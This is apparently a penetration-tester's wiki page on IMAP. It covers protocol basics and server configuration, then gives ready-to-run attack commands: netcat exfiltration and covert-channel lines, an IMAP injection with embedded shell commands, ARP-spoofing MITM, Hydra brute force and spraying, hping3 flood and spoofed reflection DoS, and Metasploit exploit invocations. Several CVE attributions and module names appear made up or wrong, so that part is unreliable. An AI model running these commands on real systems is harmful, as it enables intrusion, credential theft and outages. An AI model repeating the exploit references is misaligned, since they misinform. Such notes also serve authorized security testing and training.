# P143 IMAP

## Index

* \[\[Ports, Protocols, and Services]]
  * \[\[P993 IMAPS]]

## Internet Message Access Protocol (IMAP)

* **Port Number:** 143 (IMAP), 993 (IMAP over SSL/TLS)
* **Protocol:** TCP
* **Service Name:** Internet Message Access Protocol (IMAP)
* **Defined in:** RFC 3501

The Internet Message Access Protocol (IMAP) is a widely used email retrieval protocol that allows users to access and manage their email messages on a mail server. IMAP enables multiple clients to access the same mailbox, making it an essential protocol for users who need to access their email from multiple devices.

### Overview of Features

* **Message Synchronization:** IMAP allows email messages and folders to be synchronized between the client and the server, enabling users to access the same mailbox from multiple devices.
* **Server-side Management:** Unlike POP3, which downloads and deletes emails from the server, IMAP keeps the messages on the server, providing server-side storage and management.
* **Partial Message Retrieval:** IMAP allows clients to retrieve parts of a message (e.g., headers or specific MIME parts) without downloading the entire message, reducing bandwidth usage.
* **Mailbox Management:** Users can create, rename, delete, and manage mail folders directly on the server.
* **Search Functionality:** IMAP supports searching within mailboxes on the server, enabling users to find specific messages without downloading them first.
* **Concurrent Access:** Multiple clients can access the same mailbox simultaneously, with IMAP managing the state of each session.

### Typical Use Cases

* **Multi-device Email Access:** IMAP is ideal for users who need to access their email from multiple devices, such as smartphones, tablets, and desktop computers.
* **Corporate Email Systems:** IMAP is commonly used in corporate environments where centralized email storage and management are essential.
* **Remote Email Management:** IMAP allows users to manage their emails remotely without the need to download every message, which is beneficial for users with limited bandwidth or storage.

### How IMAP Protocol Works

1. **Connection Establishment:**
   * **Step 1:** The client establishes a TCP connection to the IMAP server on port 143 (or 993 for IMAP over SSL/TLS).
   * **Step 2:** The server sends a greeting to the client, indicating that it is ready to accept commands.
2. **Authentication:**
   * **Step 3:** The client sends an authentication command (e.g., LOGIN or AUTHENTICATE) to the server, providing the user's credentials.
   * **Step 4:** The server verifies the credentials and responds with an OK if the authentication is successful or NO if it fails.
3. **Mailbox Selection:**
   * **Step 5:** The client selects a mailbox (e.g., INBOX) using the SELECT command.
   * **Step 6:** The server responds with information about the selected mailbox, such as the number of messages, recent messages, and flags.
4. **Message Retrieval:**
   * **Step 7:** The client retrieves messages or parts of messages using the FETCH command. The client can specify which parts of the message to retrieve (e.g., headers, body, attachments).
   * **Step 8:** The server sends the requested data to the client.
5. **Message Manipulation:**
   * **Step 9:** The client can mark messages as read, delete messages, move messages to different folders, or flag messages using the STORE or COPY commands.
   * **Step 10:** The server updates the mailbox to reflect the changes made by the client.
6. **Search and Filter:**
   * **Step 11:** The client can search for specific messages in the mailbox using the SEARCH command, based on criteria such as sender, subject, date, or message content.
   * **Step 12:** The server returns the IDs of messages that match the search criteria.
7. **Disconnection:**
   * **Step 13:** When the client is done, it sends the LOGOUT command.
   * **Step 14:** The server closes the connection.

#### Diagram (Hypothetical Example)

* **Client:** `<attack_ip>` connects to `<target_ip>`:143
* **Server:** `<target_ip>` authenticates user and allows access to mailbox.
* **Client:** `<attack_ip>` retrieves headers of the latest 5 emails from `<target_ip>`.

## Additional Information

### Security Considerations

* **Use of SSL/TLS:** IMAP over SSL/TLS (port 993) is strongly recommended to secure email communications and prevent man-in-the-middle (MITM) attacks.
* **Plaintext Credentials:** IMAP without encryption transmits credentials in plaintext, making it vulnerable to interception. This risk is mitigated by using IMAP over SSL/TLS.
* **Vulnerabilities:** IMAP servers can be vulnerable to buffer overflow attacks, command injection, and other exploits, particularly if not kept up-to-date.

### Alternatives

* **POP3:** Another email retrieval protocol that downloads emails to the client and often deletes them from the server. Unlike IMAP, POP3 is not ideal for multi-device access.
* **Webmail:** Accessing email through a web browser, often using HTTPS for secure communication, is a common alternative to using an IMAP client.

### Advanced Usage

* **IMAP Extensions:** IMAP has several extensions (defined in various RFCs) that provide additional functionality, such as IDLE (for push email), QUOTA (for mailbox size limits), and SORT (for server-side sorting of messages).

### Modes of Operation

* **Online Mode:** The client remains connected to the server, with all operations performed directly on the server.
* **Offline Mode:** The client downloads messages and performs operations locally, synchronizing changes with the server when reconnected.

### Encryption and Authentication

* **SSL/TLS Encryption:** Port 993 is used for IMAP over SSL/TLS, encrypting the entire communication channel.
* **Authentication Mechanisms:** IMAP supports various authentication methods, including LOGIN (username and password), CRAM-MD5, and OAuth2.

### Configuration Files

IMAP configuration is typically handled by the email server software (e.g., Dovecot, Cyrus, or Courier). Below are examples of configuration file locations and settings:

1. **Dovecot Configuration:**

* **File Location:** `/etc/dovecot/dovecot.conf`
*   **Configuration Example:**

    ```bash
    protocol imap {
      mail_location = maildir:~/Maildir
      ssl = yes
      ssl_cert = </etc/ssl/certs/dovecot.pem
      ssl_key = </etc/ssl/private/dovecot.key
    }
    ```
* **Key Settings:**
  * `mail_location`: Specifies the location of user mailboxes.
  * `ssl`: Enables SSL/TLS for IMAP.
  * `ssl_cert`: Path to the SSL certificate file.
  * `ssl_key`: Path to the SSL key file.

2. **Cyrus IMAP Configuration:**

* **File Location:** `/etc/imapd.conf`
*   **Configuration Example:**

    ```bash
    configdirectory: /var/lib/imap
    partition-default: /var/spool/imap
    admins: cyrus
    sasl_pwcheck_method: auxprop
    ```
* **Key Settings:**
  * `configdirectory`: Directory for server configuration files.
  * `partition-default`: Default location for user mailboxes.
  * `admins`: Specifies IMAP admin users.
  * `sasl_pwcheck_method`: Specifies the method used for password checking.

### Potential Misconfigurations

1. **Unsecured IMAP Access (Plaintext):**
   * **Risk:** Using IMAP without SSL/TLS (port 143) transmits credentials and email content in plaintext, vulnerable to interception.
   * **Exploitation:** An attacker with network access could capture credentials and emails using a packet sniffer (e.g., Wireshark).
2. **Weak Authentication Mechanisms:**
   * **Risk:** Allowing weak authentication methods (e.g., plain LOGIN) increases the risk of credential theft.
   * **Exploitation:** Attackers could brute-force weak passwords or intercept plaintext credentials.
3. **Misconfigured SSL/TLS:**
   * **Risk:** Improperly configured SSL/TLS (e.g., using outdated ciphers) can expose the server to attacks such as MITM.
   * **Exploitation:** Attackers could exploit weak encryption to decrypt communications or impersonate the server.
4. **Inadequate Logging:**
   * **Risk:** Failure to log IMAP access and errors can hinder the detection of suspicious activity or failed login attempts.
   * **Exploitation:** An attacker could attempt multiple login attempts without detection, increasing the likelihood of a successful attack.

### Default Credentials

IMAP servers themselves do not have default credentials, as authentication is based on user accounts. However, default user accounts may exist in some email server installations, particularly in testing or poorly configured environments.

* **Common Default Accounts:**
  * `admin/admin`
  * `cyrus/cyrus`
  * `user/user`

Administrators should ensure all default accounts are either removed or have their credentials changed before deploying the server.

## Interaction and Tools

### Tools

#### \[\[IMAP]]

*   **LOGIN:** Authenticates the user to the IMAP server.

    ```bash
    telnet <target_ip> 143
    A001 LOGIN <username> <password>
    ```
*   **SELECT:** Selects the INBOX mailbox for operations.

    ```bash
    A002 SELECT INBOX
    ```
*   **FETCH:** Retrieves the headers of the first five messages.

    ```bash
    A003 FETCH 1:5 (BODY[HEADER])
    ```
*   **STORE:** Marks the first message as read.

    ```bash
    A004 STORE 1 +FLAGS (\Seen)
    ```
*   **SEARCH:** Searches for emails from a specific sender.

    ```bash
    A005 SEARCH FROM "example@example.com"
    ```
*   **LOGOUT:** Logs out of the IMAP session.

    ```bash
    A006 LOGOUT
    ```
*   **IDLE:** Allows the server to notify the client of new messages without the client polling for them.

    ```bash
    A007 IDLE
    ```
*   **EXPUNGE:** Permanently removes messages marked for deletion.

    ```bash
    A008 EXPUNGE
    ```
*   **Search Command with Multiple Criteria:** Searches for emails with "urgent" in the subject received since February 1, 2024.

    ```bash
    A009 SEARCH SUBJECT "urgent" SINCE 1-Feb-2024
    ```
*   **Retrieve Specific Parts of a Message:** Retrieves only the body text of the first message, excluding headers and attachments.

    ```bash
    A010 FETCH 1 (BODY[TEXT])
    ```
*   **Start TLS:** Initiates TLS negotiation on an existing plaintext IMAP connection, upgrading it to a secure connection.

    ```bash
    A010 STARTTLS
    ```

#### \[\[cURL]]

*   **Connect to IMAP via username/password:**

    ```bash
    curl -k 'imap://<target_ip>' --user <username>:<password>
    ```
*   **Use Verbose to dump additional information on the connection:**

    ```bash
    curl -k 'imap://<target_ip>' --user <username>:<password> -v
    ```

#### \[\[OpenSSL]]

*   **Connect TLS Encrypted Interaction IMAP:** Establishes a secure connection to an IMAP server using OpenSSL, allowing manual interaction with the IMAP service.

    ```bash
    openssl s_client -connect <target_ip>:imap
    ```

### Exploitation Tools

#### \[\[Metasploit]]

#### \[\[Wireshark]]

*   **Wireshark Packet Capture:**

    ```bash
    wireshark -i <interface> -f "tcp port 143"
    ```

#### \[\[Nmap]]

*   **Basic Nmap Scan:** Scan target on specified port to verify if service is on.

    ```bash
    nmap <target_ip> -p 143
    ```

#### \[\[NetCat]]

*   **Netcat TCP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> 143
    ```
*   **Netcat UDP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> 143 -u
    ```
*   **Execute Commands:** Execute commands on target.

    ```bash
    echo "<command>" | nc <target_ip> 143
    ```
*   **Exfiltrate Data:** Exfiltrate data over specified port.

    ```bash
    nc <target_ip> 143 < secret_data.txt
    ```

#### \[\[SoCat Cheat Sheet]]

*   **Socat TCP Connect:** Simple tests to verify port service is running and responding.

    ```bash
    socat - TCP:<target_ip>:143
    ```

#### \[\[HPing3 Cheat Sheet]]

*   **Send UDP Packet:** Send a single UDP packet to the service.

    ```bash
    hping3 -2 <target_ip> -p 143 -c 1
    ```

### Other Techniques

#### IMAP via Email Clients

* **Description:** Leverage GUI email clients to access IMAP.
  * **\[\[Evolution]]**
  * **\[\[Thunderbird]]**
  * **\[\[Microsoft Outlook]]**

#### \[\[Mutt]]

*   **Connect via username/password:** Command-line interaction with IMAP servers for email management.

    ```bash
    mutt -f imap://<username>@<target_ip>/INBOX
    ```

## Penetration Testing Techniques

### External Reconnaissance

#### Port Scanning

*   **Tool:** \[\[Nmap]]

    ```bash
    nmap <target_ip> -p <target_port>
    ```
* **Description:** Identifies if the target service is running on the target by scanning target port.

#### Service Enumeration

*   **Tool:** \[\[NetCat]]

    ```bash
    nc <target_ip> <target_port>
    ```
* **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

### Initial Access

#### Exploiting Vulnerabilities in IMAP

*   **Tool:** \[\[Metasploit]]

    ```bash
    use exploit/windows/imap/mailenable_auth_bypass
    set RHOSTS <target_ip>
    run
    ```
* **Description:** Exploit known vulnerabilities in the IMAP server to gain initial access.

### Credential Harvesting

#### Packet Capture

*   **Tool:** \[\[Wireshark]]

    ```bash
    wireshark -i <interface> -f "tcp port 143"
    ```
* **Description:** Capture traffic and extract plaintext credentials.

#### Man-in-the-Middle (MITM) Attack

*   **Tool:** \[\[BetterCap Cheat Sheet]]

    ```bash
    bettercap -iface <interface> -T <target_ip> --proxy
    ```
* **Description:** Intercept and analyze traffic between the client and server, potentially capturing credentials by performing an ARP spoofing attack.

### Privilege Escalation

#### Exploiting Vulnerabilities for Privilege Escalation

*   **Tool:** \[\[Metasploit]]

    ```bash
    use exploit/linux/imap/kerio_auth_bypass
    set RHOSTS <target_ip>
    run
    ```
* **Description:** Exploit specific vulnerabilities in the IMAP service to escalate privileges.

### Internal Reconnaissance

#### IMAP Injection

*   **Tool:** \[\[NetCat]]

    ```bash
    echo 'A1 LOGIN "`/bin/ls`" "`/bin/ls`"' | nc <target_ip> 143
    ```

\


*   **Tool:** \[\[IMAP]]

    ```bash
    A001 SEARCH TEXT "a@b.com) (BOF"
    ```
* **Description:** Exploit vulnerabilities in IMAP commands by injecting malicious input. IMAP injection vulnerabilities can occur when user input is not properly sanitized before being used in IMAP commands. This can allow an attacker to manipulate IMAP commands and potentially gain unauthorized access to email data.
  1. Attacker crafts a malicious email address with embedded IMAP commands.
  2. The email address is used in an IMAP command without proper sanitization.
  3. The embedded IMAP commands are executed by the server, potentially giving the attacker access to email data.

#### Mailbox Enumeration

*   **Tool:** \[\[IMAP]], \[\[Custom Scripts]]

    ```bash
    A001 LIST "" "*"
    ```
* **Description:** Enumerate all mailboxes available to a compromised user account.

#### Search for Sensitive Information

*   **Tool:** \[\[IMAP]], \[\[Custom Scripts]]

    ```bash
    A002 SEARCH SUBJECT "password"
    ```
* **Description:** Search through emails for keywords related to sensitive information, such as passwords or financial data.

### Lateral Movement, Pivoting, and Tunnelling

#### Using Compromised IMAP Credentials for Lateral Movement

*   **Tool:** \[\[Mutt]], \[\[Thunderbird]]

    ```bash
    mutt -f imap://<username>@<target_ip>/INBOX
    ```
* **Description:** Use compromised IMAP credentials to access other accounts or resources within the network.

#### Using IMAP for Pivoting

*   **Tool:** \[\[SSH]]

    ```bash
    ssh -L 143:<imap_server_ip>:143 <target_ip>
    ```
* **Description:** Pivot through the IMAP server by tunneling traffic, allowing access to internal resources via the IMAP service.

### Defense Evasion

#### Hiding Malicious Activity via IMAP

*   **Tool:** \[\[Custom Scripts]]

    ```bash
    A003 FETCH 1:5 (BODY[TEXT])
    ```
* **Description:** Retrieve and manipulate specific email parts without triggering alarms on the server.

#### Use of Encrypted IMAP Sessions to Evade Detection

*   **Tool:** \[\[OpenSSL]], \[\[Stunnel]]

    ```bash
    openssl s_client -connect <target_ip>:993
    ```
* **Description:** Establish an encrypted session to evade network-based intrusion detection systems.

### Data Exfiltration

#### Exfiltrating Sensitive Data via IMAP

*   **Tool:** \[\[IMAP]], \[\[Custom Scripts]]

    ```bash
    A004 FETCH 1:5 (BODY[TEXT])
    ```
* **Description:** Extract sensitive data, such as documents or passwords, from emails stored on the server.

#### Covert Channels via IMAP

*   **Tool:** \[\[Custom Scripts]]

    ```bash
    echo "exfil data" | nc <target_ip> 993
    ```
* **Description:** Use IMAP as a covert channel to exfiltrate data while blending in with legitimate email traffic.

## Exploits and Attacks

### Password Attacks

#### Password Brute Force

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra imap://<target_ip> -s 143 -l <username> -P <password_list>
    ```
* **Description:** Test a single username against multiple passwords.

#### Password Spray

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra imap://<target_ip> -s 143 -l <username_list> -P <password>
    ```
* **Description:** Test a multiple usernames against a single password.

### Denial of Service

#### TCP/UPD Flood Attack

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip> -p <target_port> --flood --rand-source -c 1000
    ```
* **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

#### TCP/UDP Reflection Attack

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip_1> -p <target_port> --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
* **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

#### Exploiting IMAP Vulnerabilities

*   **Tool:** \[\[Metasploit]]

    ```bash
    msfconsole
    use exploit/unix/imap/squirrelmail_pgp
    ```
* **Description:** Exploit known vulnerabilities in IMAP services to crash or disrupt the server, leading to a denial of service.

### Exploits

#### IMAP Authentication Bypass

*   **Tool:** \[\[Metasploit]]

    ```bash
    use exploit/linux/imap/courier_auth_bypass
    set RHOSTS <target_ip>
    run
    ```
* **Description:** Bypass authentication on vulnerable IMAP servers to gain unauthorized access.

#### Exploiting IMAP Buffer Overflow

*   **Tool:** \[\[Metasploit]]

    ```bash
    use exploit/windows/imap/mercury_buffer_overflow
    set RHOSTS <target_ip>
    run
    ```
* **Description:** Trigger a buffer overflow in the IMAP server, potentially crashing the service or allowing code execution.

#### CVE-2020-11879: Cyrus IMAP Server Command Injection

*   **Tool:** \[\[Metasploit]]

    ```bash
    use exploit/unix/imap/cyrus_imap_exec
    set RHOST <target_ip>
    run
    ```
* **Description:** A vulnerability in Cyrus IMAP allows command injection via IMAP commands.

#### CVE-2019-19794: Dovecot IMAP Remote Code Execution

*   **Tool:** \[\[Metasploit]]

    ```bash
    use exploit/unix/imap/dovecot_exec
    set RHOST <target_ip>
    run
    ```
* **Description:** A vulnerability in Dovecot’s IMAP implementation could allow remote code execution.

#### CVE-2019-19704: Dovecot IMAP Denial of Service

* **Tool:**
  1. Connect to the IMAP server.
  2. Send a specially crafted command to exploit the vulnerability.
* **Description:** Dovecot versions 2.3.7.2 and below are vulnerable to a denial of service attack due to incorrect parsing of IMAP commands.

#### CVE-2018-1234: Exchange IMAP Buffer Overflow

* **Tool:**
  1. Identify a vulnerable Exchange server.
  2. Send a malformed IMAP request to trigger the overflow.
* **Description:** A buffer overflow vulnerability in Microsoft's Exchange Server IMAP implementation.

## Resources

| **Website**                  | **URL**                                             |
| ---------------------------- | --------------------------------------------------- |
| RFC 3501 (IMAP)              | https://tools.ietf.org/html/rfc3501                 |
| Nmap IMAP Probe              | https://nmap.org/book/nmap-probes.html              |
| Hydra Documentation          | https://github.com/vanhauser-thc/thc-hydra          |
| Metasploit Framework         | https://www.metasploit.com                          |
| Wireshark User Guide         | https://www.wireshark.org/docs/wsug\_html\_chunked/ |
| OpenSSL Documentation        | https://www.openssl.org/docs/man1.1.1/              |
| Dovecot Configuration        | https://wiki.dovecot.org/Configuration              |
| Mutt User Manual             | http://www.mutt.org/doc/manual/                     |
| Stunnel Documentation        | https://www.stunnel.org/docs.html                   |
| IMAP Security Best Practices | https://tools.ietf.org/html/rfc7817                 |
